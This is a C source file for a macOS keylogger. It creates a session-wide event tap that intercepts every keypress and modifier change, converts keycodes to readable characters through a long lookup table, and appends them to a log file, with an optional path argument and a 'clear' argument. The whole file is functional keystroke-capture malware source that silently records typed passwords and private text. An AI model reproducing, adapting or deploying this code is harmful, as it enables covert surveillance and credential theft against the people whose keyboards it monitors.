#include "keylogger.h"

int main(int argc, const char *argv[]) {

    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Clear the logfile if clear argument used or log to specific file if given.
    if (argc == 2) {
        if(strcmp(argv[1], "clear") == 0) {
            fopen(logfileLocation, "w");
            printf("%s cleared.\n", logfileLocation);
            fflush(stdout);
            exit(1);
        } else {
            logfileLocation = argv[1];
        }
    }

    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(logfileLocation, "a");

    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    // fprintf(logfile, "\n\nKeylogging has begun: %s\n", asctime(localtime(&result)));
    // fflush(logfile);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s\n", logfileLocation);
    fflush(stdout);
    CFRunLoopRun();

    return 0;
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Print the human readable key to the logfile.
    fprintf(logfile, "%s", convertKeyCode(keyCode));
    fflush(logfile);

    return event;
}

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
const char *convertKeyCode(int keyCode) {
    switch ((int) keyCode) {
        case 0:   return "a";
        case 1:   return "s";
        case 2:   return "d";
        case 3:   return "f";
        case 4:   return "h";
        case 5:   return "g";
        case 6:   return "z";
        case 7:   return "x";
        case 8:   return "c";
        case 9:   return "v";
        case 11:  return "b";
        case 12:  return "q";
        case 13:  return "w";
        case 14:  return "e";
        case 15:  return "r";
        case 16:  return "y";
        case 17:  return "t";
        case 18:  return "1";
        case 19:  return "2";
        case 20:  return "3";
        case 21:  return "4";
        case 22:  return "6";
        case 23:  return "5";
        case 24:  return "\n";
        case 25:  return "9";
        case 26:  return "7";
        case 27:  return "\n";
        case 28:  return "8";
        case 29:  return "0";
        case 30:  return "\n";
        case 31:  return "o";
        case 32:  return "u";
        case 33:  return "\n";
        case 34:  return "i";
        case 35:  return "p";
        case 37:  return "l";
        case 38:  return "j";
        case 39:  return "\n";
        case 40:  return "k";
        case 41:  return "\n";
        case 42:  return "\n";
        case 43:  return "\n";
        case 44:  return "\n";
        case 45:  return "n";
        case 46:  return "m";
        case 47:  return "\n";
        case 50:  return "\n";
        case 65:  return "\n";
        case 67:  return "\n";
        case 69:  return "\n";
        case 71:  return "\n";
        case 75:  return "\n";
        case 76:  return "\n";
        case 78:  return "\n";
        case 81:  return "\n";
        case 82:  return "0";
        case 83:  return "1";
        case 84:  return "2";
        case 85:  return "3";
        case 86:  return "4";
        case 87:  return "5";
        case 88:  return "6";
        case 89:  return "7";
        case 91:  return "8";
        case 92:  return "9";
        case 36:  return "\n";
        case 48:  return "\n";
        case 49:  return "\n";
        case 51:  return "\n";
        case 53:  return "\n";
        case 54:  return "\n";
        case 55:  return "\n";
        case 56:  return "\n";
        case 57:  return "\n";
        case 58:  return "!";
        case 59:  return "\n";
        case 60:  return "\n";
        case 61:  return "\n";
        case 62:  return "\n";
        case 63:  return "\n";
        case 64:  return "\n";
        case 72:  return "\n";
        case 73:  return "\n";
        case 74:  return "\n";
        case 79:  return "\n";
        case 80:  return "\n";
        case 90:  return "\n";
        case 96:  return "\n";
        case 97:  return "\n";
        case 98:  return "\n";
        case 99:  return "\n";
        case 100: return "\n";
        case 101: return "\n";
        case 103: return "\n";
        case 105: return "\n";
        case 106: return "\n";
        case 107: return "\n";
        case 109: return "\n";
        case 111: return "\n";
        case 113: return "\n";
        case 114: return "\n";
        case 115: return "\n";
        case 116: return "\n";
        case 117: return "\n";
        case 118: return "\n";
        case 119: return "\n";
        case 120: return "\n";
        case 121: return "\n";
        case 122: return "\n";
        case 123: return "\n";
        case 124: return "\n";
        case 125: return "\n";
        case 126: return "\n";
    }
    return "\n";
}
